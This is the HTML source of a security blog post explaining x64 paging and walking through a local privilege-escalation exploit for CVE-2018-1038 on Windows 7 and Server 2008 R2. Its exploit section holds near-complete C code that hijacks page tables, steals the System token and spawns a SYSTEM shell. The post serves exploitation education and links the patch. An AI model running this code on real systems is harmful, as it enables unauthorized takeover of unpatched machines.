@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    
+    <title>Exploiting CVE-2018-1038 - Total Meltdown - XPN InfoSec Blog</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!--Description-->
+    
+        <meta name="description" content="This week I had some free time to look into CVE-2018-1038 aka Total Meltdown. The aim was to create a quick exploit which could be used to elevate privileges during an assessment. I ended up delving into Windows memory management more than I had before.">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Adam Chester">
+    
+
+    <!--Favicon-->
+    
+      <link rel="icon" href="images/favicon.ico">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Exploiting CVE-2018-1038 - Total Meltdown"/>
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="XPN InfoSec Blog"/>
+
+    <!--Page Cover-->
+    
+        <meta property="og:image" content="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/exploit_image-1.png" />
+    
+
+    <meta name="twitter:site" content="@_xpn_"/>
+<meta name="twitter:creator" content="@_xpn_"/>
+
+    <meta name="twitter:card" content="summary_large_image"/>
+    <meta name="twitter:title" content="@_xpn_ - Exploiting CVE-2018-1038 - Total Meltdown"/>
+    <meta name="twitter:image" content="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/exploit_image-1.png"/>
+
+<meta name="twitter:url" content="https://blog.xpnsec.com/total-meltdown-cve-2018-1038/index.html"/>
+
+    <meta name="theme-color" content="#ffffff">
+    <link href='https://fonts.googleapis.com/css?family=Roboto:400,300,700|Noto+Serif:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,700" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/themes/prism.min.css" rel="stylesheet" />
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/sass/main.css">
+
+
+    <!-- Google Analytics -->
+    
+    <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-93082799-1', 'auto');
+        ga('send', 'pageview');
+
+    </script>
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/default.min.css" integrity="sha384-zhIsEafzyQWHSoMCQ4BfT8ZlRXQyIFwAHAJn32PNdsb8n6tVysGZSLpEEIvCskw4" crossorigin="anonymous">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js" integrity="sha384-vG5ueWbnY1VP7nl03G97FIV56vNtYfp+rm3tvRLHeQZhRzq1kLd1nZZhYeQ+00u7" crossorigin="anonymous"></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js" integrity="sha256-0rguYS0qgS6L4qVzANq4kjxPLtvnp5nn2nB5G1lWRv4=" crossorigin="anonymous"></script>
+    <script src="https://kit.fontawesome.com/26753e0838.js"></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/rss.xml" title="XPN InfoSec Blog" type="application/rss+xml">
+</head>
+
+
+<body id="top">
+  <div class="lateral">
+    <aside class="author">
+      <a href="https://blog.xpnsec.com"><img class="profile-image" src="/images/profile-image.jpg" alt="avatar" /></a>
+      <p class="title">XPN</p>
+      <p class="name">Adam Chester</p>
+      <p class="about">Hacker and Infosec Researcher</p>
+      <p class="link"><a href="/about" title="About">About Me</a></p>
+      <ul class="social">
+        <li><a href="https://twitter.com/_xpn_" target="_blank"><i class="fab fa-twitter" aria-hidden="true"></i></a></li>
+        <li><a href="https://www.linkedin.com/in/xpn" target="_blank"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li>
+        <li><a href="mailto:xpnsec[at]protonmail.com" target="_blank"><i class="fas fa-envelope" aria-hidden="true"></i></a></li>
+        <li><a href="https://github.com/xpn" target="_blank"><i class="fab fa-github" aria-hidden="true"></i></a></li>
+        <li><a href="https://blog.xpnsec.com/rss/" target="_blank"><i class="fas fa-rss"></i></a></li>
+      </ul>
+    </aside>
+  </div>
+  <div class="home-template home">
+    <!--[if lt IE 8]>
+      <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/" target="_blank" rel="noopener">upgrade your browser</a> to improve your experience.</p>
+    <![endif]-->
+    <header class="site-header">   
+      <h2><a class="logo ir" href="https://blog.xpnsec.com" title="XPN InfoSec Blog">XPN InfoSec Blog</a></h2>
+    </header>
+    <div class="container clearfix">
+      <main class="content" role="main">
+        <div  class="post-template">
+  <article class="post">
+    <a class="btn" href="https://blog.xpnsec.com" title="Back to homepage">« Back to home</a>
+
+
+      <h1 itemprop="name">
+        <a href="/total-meltdown-cve-2018-1038/">Exploiting CVE-2018-1038 - Total Meltdown</a>
+      </h1>
+
+
+<footer class="post-info">
+  Posted on 
+      <span class="post-meta">
+        <time>
+          2018-04-23
+        </time>
+        
+          <span>Tagged in </span>
+        
+        
+        <a href="/tags/windows/" class="button small">windows</a>, <a href="/tags/exploit/" class="button small">exploit</a>, <a href="/tags/kernel/" class="button small">kernel</a>
+      </span>
+
+  
+
+  </footer>
+
+
+<p>Back in March, a vulnerability was disclosed by Ulf Frisk in Windows 7 and Server 2008 R2.</p>
+<p>The vulnerability is pretty awesome, a patch released by Microsoft to mitigate the Meltdown vulnerability inadvertently opened up a hole on versions of Windows, allowing any process to access and modify page table entries.</p>
+<p>The writeup of the vulnerability can be found over on Ulf’s blog <a href="http://blog.frizk.net/2018/03/total-meltdown.html" target="_blank" rel="noopener">here</a>, and is well worth a read.</p>
+<p>This week I had some free time, so I decided to dig into the vulnerability and see just how the issue manifested itself. The aim was to create a quick exploit which could be used to elevate privileges during an assessment. I ended up delving into Windows memory management more than I had before, so this post was created to walk through just how an exploit can be crafted for this kind of vulnerability.</p>
+<p>As always, this post is for people looking to learn about exploitation techniques rather than simply providing a ready to fire exploit. With that said, let’s start with some paging fundamentals.</p>
+<h2 id="Paging-fundamentals"><a href="#Paging-fundamentals" class="headerlink" title="Paging fundamentals"></a>Paging fundamentals</h2><p>To understand the workings of this vulnerability, we first need cover some of the fundamentals of how paging works on the x86/x64 architecture.</p>
+<p>As we all know, a virtual address on a x64 OS usually looks something like:</p>
+<pre><code>0x7fffffd6001</code></pre><p>Unbeknown to some however, the virtual address is not just a pointer to an arbitrary location in RAM… it actually made up of a number of fields which have a specific purpose when translating virtual addresses to physical addresses.</p>
+<p>Let’s start by converting the above virtual memory address into binary:</p>
+<pre><code>0000000000000000 000001111 111111111 111111111 111010110 000000000001</code></pre><p>Working left to right, we first disregard the first 16 bits as these bits are actually meaningless to us (they are simply set to mirror the 48th bit of a virtual address).</p>
+<p>Starting at an offset of 48 bits:</p>
+<ul>
+<li>The first 9 bits of <code>000001111</code> (15 in decimal), are an offset into a PML4 table.</li>
+<li>The next 9 bits of <code>111111111</code> (511 in decimal) are an offset into a PDPT table.</li>
+<li>The next 9 bits of <code>111111111</code> (511 in decimal) are an offset into a PD table.</li>
+<li>The next 9 bits of <code>111010110</code> (470 in decimal) are an offset into a PT table.</li>
+<li>Finally, the 12 bits of <code>000000000001</code> (1 in decimal) are an offset into a page of memory.</li>
+</ul>
+<p>Of course, the next question to ask is… just what are PML4, PDPT, PD, and PT!!</p>
+<h2 id="PML4-PDPT-PD-and-PT"><a href="#PML4-PDPT-PD-and-PT" class="headerlink" title="PML4, PDPT, PD and PT"></a>PML4, PDPT, PD and PT</h2><p>In x64 architecture, translating virtual addresses to physical addresses is done using a set of paging tables, pointed to by the <code>CR3</code> register:</p>
+<ul>
+<li>PML4 - Page Map Level 4</li>
+<li>PDPT - Page Directory Pointer Table</li>
+<li>PD - Page Directory</li>
+<li>PT - Page Table</li>
+</ul>
+<p>Each table is responsible for providing both a physical addresses of where our data is stored, and flags associated with this memory location.</p>
+<p>For example, an entry in a page table can be responsible for providing a pointer to the next table in the lookup chain, for setting the NX bit on a page of memory, or to ensure that kernel memory is not accessible to applications running on the OS.</p>
+<p>Simplified, the above virtual address lookup would flow through the tables like this:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/corrected_page_flow.png" alt="corrected_page_flow"></p>
+<p>Here we see that the process of traversing these tables is completed by each entry providing a pointer to the next table, with the final entry ultimately pointing to a physical address in memory where data is stored.</p>
+<p>As you can imagine, storing and managing page tables for each process on an OS can take a lot of effort. One trick used by OS developers to ease this process is a technique called “Self-Referencing Page Tables”.</p>
+<h2 id="Self-Referencing-Page-Tables"><a href="#Self-Referencing-Page-Tables" class="headerlink" title="Self-Referencing Page Tables"></a>Self-Referencing Page Tables</h2><p>Put simply, Self-Referencing Page Tables work by utilising a field in the PML4 table which references itself. For example, if we create a new entry in the PML4 table at an index <code>0x100</code>, and the entry points back to the PML4 table’s physical address, we have what is called a “Self-Referencing Entry”.</p>
+<p>So why would anyone do this? Well, this actually gives us a set of virtual addresses where we can reference and modify any of the page tables in our virtual address space.</p>
+<p>For example, if we want to modify the PML4 table for our process, we can simply reference the virtual address <code>0x804020100000</code>, which translates to:</p>
+<ol>
+<li>PML4 index 0x100 - Physical address of PML4</li>
+<li>PDPT index 0x100 - Again, physical address of PML4</li>
+<li>PD index 0x100 - Again.. physical address of PML4</li>
+<li>PT index 0x100 - Again…… physical address of PML4</li>
+</ol>
+<p>Which ultimately returns the memory of… PML4.</p>
+<p>Hopefully this gives you an idea as to the power of this recursive nature of self-referencing page tables.. believe me it took a few evenings staring at the screen to get my head around that :D</p>
+<p>Using the below code as a further example, we can see that a virtual address of <code>ffff804020100000</code> allows us to retrieve the PML4 table for editing, where index 0x100 of PML4 is a self-reference.</p>
+<pre><code>package main
+
+import (
+    &quot;fmt&quot; 
+)
+
+func VAtoOffsets(va uint64) {
+    phy_offset := va &amp; 0xFFF
+    pt_index := (va &gt;&gt; 12) &amp; 0x1FF
+    pde_index := (va &gt;&gt; (12 + 9)) &amp; 0x1FF
+    pdpt_index := (va &gt;&gt; (12 + 9 + 9)) &amp; 0x1FF
+    pml4_index := (va &gt;&gt; (12 + 9 + 9 + 9)) &amp; 0x1FF
+
+    fmt.Printf(&quot;PML4 Index: %03x\n&quot;, pml4_index)
+    fmt.Printf(&quot;PDPT Index: %03x\n&quot;, pdpt_index)
+    fmt.Printf(&quot;PDE Index: %03x\n&quot;, pde_index)
+    fmt.Printf(&quot;PT Index: %03x\n&quot;, pt_index)
+    fmt.Printf(&quot;Page offset: %03x\n&quot;, phy_offset)
+}
+
+func OffsetsToVA(phy_offset, pt_index, pde_index, pdpt_index, pml4_index uint64) {
+    var va uint64
+
+    va = pml4_index &lt;&lt; (12 + 9 + 9 + 9)
+    va = va | pdpt_index &lt;&lt; (12 + 9 + 9)
+    va = va | pde_index &lt;&lt; (12 + 9)
+    va = va | pt_index &lt;&lt; 12
+    va = va | phy_offset
+
+    if ((va &amp; 0x800000000000) == 0x800000000000) {
+        va |= 0xFFFF000000000000
+    }
+
+    fmt.Printf(&quot;Virtual Address: %x\n&quot;, va)
+}
+
+func main() {
+    VAtoOffsets(0xffff804020100000)
+    OffsetsToVA(0, 0x100, 0x100, 0x100, 0x100)
+}</code></pre><p>You can run this code in a browser to see the results: <a href="https://play.golang.org/p/tyQUoox47ri" target="_blank" rel="noopener">https://play.golang.org/p/tyQUoox47ri</a></p>
+<p>Now, let’s say we want to modify the PDPT entry of a virtual address. Using the self-referencing technique, this becomes simple, by simply reducing the amount of times that we recurse through the self-referencing entry.</p>
+<p>For example, given a PML4 index of <code>0x150</code>, and our self-referencing entry in <code>0x100</code>, we can return the corresponding PDPT table with the address <code>0xffff804020150000</code>. Again our golang application can help to illustrate just how this is the case: <a href="https://play.golang.org/p/f02hYYFgmWo" target="_blank" rel="noopener">https://play.golang.org/p/f02hYYFgmWo</a>.</p>
+<h2 id="The-bug"><a href="#The-bug" class="headerlink" title="The bug"></a>The bug</h2><p>OK, so now we understand the fundamentals, we can move on to the vulnerability.</p>
+<p>If we apply the <a href="https://www.catalog.update.microsoft.com/ScopedViewInline.aspx?updateid=900e7fbc-cf96-4493-aa73-23227de0f62b" target="_blank" rel="noopener">2018-02</a> security update to Windows 7 x64 or Server 2008 R2 x64, what we find is that the PML4 entry of <code>0x1ed</code> has been updated.</p>
+<p>On my vulnerable lab instance, PML4’s entry <code>0x1ed</code> appears similar to this:</p>
+<pre><code>000000002d282867</code></pre><p>Here we have a number of flags, however what we should pay attention to is the 3rd bit of this page table entry. Bit 3, if set, allows access to the page of memory from user-mode, rather than access being restricted to the kernel… :O</p>
+<p>Worse, PML4 entry <code>0x1ed</code> is used as the Self-Referencing Entry in Windows 7 and Server 2008 R2 x64, meaning that any user-mode process is granted access to view and modify the PML4 page table.</p>
+<p>And as we now know, by modifying this top level page table, we actually have the ability to view modify all physical memory on the system… <code>\_(ö)_/</code></p>
+<h2 id="The-exploit"><a href="#The-exploit" class="headerlink" title="The exploit"></a>The exploit</h2><p>So how do we go about exploiting this? Well to leverage the flaw and achieve privilege escalation, we will use a number of steps to our exploit:</p>
+<ol>
+<li>Create a new set of page tables which will allow access to any physical memory address.</li>
+<li>Create a set of signatures which can be used to hunt for <code>_EPROCESS</code> structures in kernel memory.</li>
+<li>Find the <code>_EPROCESS</code> memory address for our executing process, and for the System process.</li>
+<li>Replace the token of our executing process with that of System, elevating us to <code>NT AUTHORITY\System</code>.</li>
+</ol>
+<p>Before we begin, I should mention that none of this post would have been possible without PCILeech’s code found <a href="https://github.com/ufrisk/pcileech/blob/master/pcileech/devicetmd.c" target="_blank" rel="noopener">here</a>. Being the first time I’ve really dug into OS paging at this level before, the exploit code used by <code>devicetmd.c</code> had me awake for a few nights trying to wrap my head around just how it worked, so huge kudo’s to Ulf Frisk for finding the vulnerability and PCILeech!</p>
+<p>Rather than simply reimplementing Ulf’s paging technique, we will use the PCILeech code to set up our page table. To make things a bit easier to follow, I’ve updated a few of the magic numbers and added comments to explain just what is happening:</p>
+<pre><code>unsigned long long iPML4, vaPML4e, vaPDPT, iPDPT, vaPD, iPD;
+DWORD done;
+
+// setup: PDPT @ fixed hi-jacked physical address: 0x10000
+// This code uses the PML4 Self-Reference technique discussed, and iterates until we find a &quot;free&quot; PML4 entry
+// we can hijack.
+for (iPML4 = 256; iPML4 &lt; 512; iPML4++) {
+    vaPML4e = PML4_BASE + (iPML4 &lt;&lt; 3);
+    if (*(unsigned long long *)vaPML4e) { continue; }
+
+    // When we find an entry, we add a pointer to the next table (PDPT), which will be
+    // stored at the physical address 0x10000
+    // The flags &quot;067&quot; allow user-mode access to the page.
+    *(unsigned long long *)vaPML4e = 0x10067;
+    break;
+}
+printf(&quot;[*] PML4 Entry Added At Index: %d\n&quot;, iPML4);
+
+// Here, the PDPT table is references via a virtual address.
+// For example, if we added our hijacked PML4 entry at index 256, this virtual address
+// would be 0xFFFFF6FB7DA00000 + 0x100000
+// This allows us to reference the physical address 0x10000 as:
+// PML4 Index: 1ed | PDPT Index : 1ed |    PDE Index : 1ed | PT Index : 100
+vaPDPT = PDP_BASE + (iPML4 &lt;&lt; (9 * 1 + 3));
+printf(&quot;[*] PDPT Virtual Address: %p&quot;, vaPDPT);
+
+// 2: setup 31 PDs @ physical addresses 0x11000-0x1f000 with 2MB pages
+// Below is responsible for adding 31 entries to the PDPT
+for (iPDPT = 0; iPDPT &lt; 31; iPDPT++) {
+    *(unsigned long long *)(vaPDPT + (iPDPT &lt;&lt; 3)) = 0x11067 + (iPDPT &lt;&lt; 12);
+}
+
+// For each of the PDs, a further 512 PT&apos;s are created. This gives access to
+// 512 * 32 * 2mb = 33gb physical memory space
+for (iPDPT = 0; iPDPT &lt; 31; iPDPT++) {
+    if ((iPDPT % 3) == 0)
+        printf(&quot;\n[*] PD Virtual Addresses: &quot;);
+
+    vaPD = PD_BASE + (iPML4 &lt;&lt; (9 * 2 + 3)) + (iPDPT &lt;&lt; (9 * 1 + 3));
+    printf(&quot;%p &quot;, vaPD);
+
+    for (iPD = 0; iPD &lt; 512; iPD++) {
+        // Below, notice the 0xe7 flags added to each entry.
+        // This is used to create a 2mb page rather than the standard 4096 byte page.
+        *(unsigned long long *)(vaPD + (iPD &lt;&lt; 3)) = ((iPDPT * 512 + iPD) &lt;&lt; 21) | 0xe7;
+    }
+}
+
+printf(&quot;\n[*] Page tables created, we now have access to ~33gb of physical memory\n&quot;);</code></pre><p>Now we have our page table set up, we need to hunt for <code>_EPROCESS</code> structures in physical memory. Let’s take a look at how our <code>_EPROCESS</code> object looks in kernel memory:</p>
+<p><img src="https://res.cloudinary.com/xpnsec/image/upload/images/2018/04/eprocess_our_process.png" alt="eprocess_our_process"></p>
+<p>To create a simple signature, we can use the fields <code>ImageFileName</code>, and <code>PriorityClass</code>, which we will use to scan through memory until we get a hit. This appeared to work in my lab, however if you find that you are getting false positives, you can be as granular as you like:</p>
+<pre><code>#define EPROCESS_IMAGENAME_OFFSET 0x2e0
+#define EPROCESS_TOKEN_OFFSET 0x208
+#define EPROCESS_PRIORITY_OFFSET 0xF  // This is the offset from IMAGENAME, not from base
+
+unsigned long long ourEPROCESS = 0, systemEPROCESS = 0;
+unsigned long long exploitVM = 0xffff000000000000 + (iPML4 &lt;&lt; (9 * 4 + 3));
+STARTUPINFOA si;
+PROCESS_INFORMATION pi;
+
+ZeroMemory(&amp;si, sizeof(si));
+si.cb = sizeof(si);
+ZeroMemory(&amp;pi, sizeof(pi));
+
+printf(&quot;[*] Hunting for _EPROCESS structures in memory\n&quot;);
+for (int i = 0x100000; i &lt; 31 * 512 * 2097152; i++) {
+    __try {
+        // Locate EPROCESS via the IMAGE_FILE_NAME field, and PRIORITY_CLASS field
+        if (ourEPROCESS == 0 &amp;&amp; memcmp(&quot;TotalMeltdownP&quot;, (unsigned char *)(exploitVM + i), 14) == 0) {
+            if (*(unsigned char *)(exploitVM + i + EPROCESS_PRIORITY_OFFSET) == 0x2) {
+                ourEPROCESS = exploitVM + i - EPROCESS_IMAGENAME_OFFSET;
+                printf(&quot;[*] Found our _EPROCESS at %p\n&quot;, ourEPROCESS);
+            }
+        }
+        // Locate EPROCESS via the IMAGE_FILE_NAME field, and PRIORITY_CLASS field
+        else if (systemEPROCESS == 0 &amp;&amp; memcmp(&quot;System\0\0\0\0\0\0\0\0\0&quot;, (unsigned char *)(exploitVM + i), 14) == 0) {
+            if (*(unsigned char *)(exploitVM + i + EPROCESS_PRIORITY_OFFSET) == 0x2) {
+                systemEPROCESS = exploitVM + i - EPROCESS_IMAGENAME_OFFSET;
+                printf(&quot;[*] Found System _EPROCESS at %p\n&quot;, systemEPROCESS);
+            }
+        }
+
+        if (systemEPROCESS != 0 &amp;&amp; ourEPROCESS != 0) {
+            ...
+            break;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER) {
+        printf(&quot;[X] Exception occured, stopping to avoid BSOD\n&quot;);
+    }
+}</code></pre><p>Finally, as with most kernel privilege escalation exploits (see my previous tutorials <a href="/hevd-null-pointer/">here</a>, <a href="/hevd-stack-overflow/">here</a> and <a href="/windows-warbird-privesc/">here</a>), we need to replace our <code>_EPROCESS.Token</code> field with that of the <code>System</code> process token:</p>
+<pre><code>if (systemEPROCESS != 0 &amp;&amp; ourEPROCESS != 0) {
+    // Swap the tokens by copying the pointer to System Token field over our process token
+    printf(&quot;[*] Copying access token from %p to %p\n&quot;, systemEPROCESS + EPROCESS_TOKEN_OFFSET, ourEPROCESS + EPROCESS_TOKEN_OFFSET);
+    *(unsigned long long *)((char *)ourEPROCESS + EPROCESS_TOKEN_OFFSET) = *(unsigned long long *)((char *)systemEPROCESS + EPROCESS_TOKEN_OFFSET);
+    printf(&quot;[*] Done, spawning SYSTEM shell...\n\n&quot;);
+
+    CreateProcessA(0,
+                   &quot;cmd.exe&quot;,
+                   NULL,
+                   NULL,
+                   TRUE,
+                   0,
+                   NULL,
+                   NULL,
+                   &amp;si,
+                   &amp;pi);
+
+    break;
+}</code></pre><p>And as we can see in the below demo, we now have a nice way to elevate privileges on Windows 7 x64:</p>
+<div class="video-container"><iframe src="https://www.youtube.com/embed/5fl5jFy4XMg" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
+
+<p>The final code can also be found over on Github <a href="https://gist.github.com/xpn/bdb99cee8895bab4b1a0671696570d94" target="_blank" rel="noopener">here</a>.</p>
+<p>Edit: A new version of the code, which implements some memory checking, can now also be found on Github <a href="https://gist.github.com/xpn/3792ec34d712425a5c47caf5677de5fe" target="_blank" rel="noopener">here</a>.</p>
+<h2 id="The-fix-and-improvements"><a href="#The-fix-and-improvements" class="headerlink" title="The fix, and improvements"></a>The fix, and improvements</h2><p>To ensure that your system is mitigated against this exploit, Microsoft have released a patch for CVE-2018-1038 <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-1038" target="_blank" rel="noopener">here</a> which can be deployed to remediate this issue.</p>
+<p>Now for anyone who has ever done any low-level development in the past, you may have noticed that the above exploit code does not include further checks for device mapped memory when seeking for <code>_EPROCESS</code> objects. During my lab tests this didn’t show as an issue, however when encountering differing hardware and environments, additional checks should be added to ensure BSOD risks are reduced. If you feel like tackling this, please sent me your implementation and I’d be happy to update the exploit / post.</p>
+<p>Edit: To try and reduce the chance of BSOD, I’ve implemented some additional memory checks with a second version of the POC which can be found on Github <a href="https://gist.github.com/xpn/3792ec34d712425a5c47caf5677de5fe" target="_blank" rel="noopener">here</a>.</p>
+<h2 id="References-and-additional-reading"><a href="#References-and-additional-reading" class="headerlink" title="References and additional reading"></a>References and additional reading</h2><ul>
+<li><a href="http://blog.frizk.net/2018/03/total-meltdown.html" target="_blank" rel="noopener">Total Meltdown vulnerability</a></li>
+<li><a href="https://os.phil-opp.com/page-tables/#recursive-mapping" target="_blank" rel="noopener">Writing an OS in RUST - Page Tables</a></li>
+<li><a href="https://play.golang.org/p/tyQUoox47ri" target="_blank" rel="noopener">Page Table calculation in GO</a></li>
+</ul>
+
+  </article>
+</div>
+
+      </main> 
+    </div>
+    <footer class="main-footer">
+  <div class="container clearfix">
+    <a href="https://blog.xpnsec.com/rss/" title="RSS Feed"><i class="fa fa-rss"></i></a>
+  </div>
+</footer>
+
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    
+<script src="/js/skel.min.js"></script>
+
+    
+<script src="/js/main.js"></script>
+
+    </div>
+  </body>
+</html>
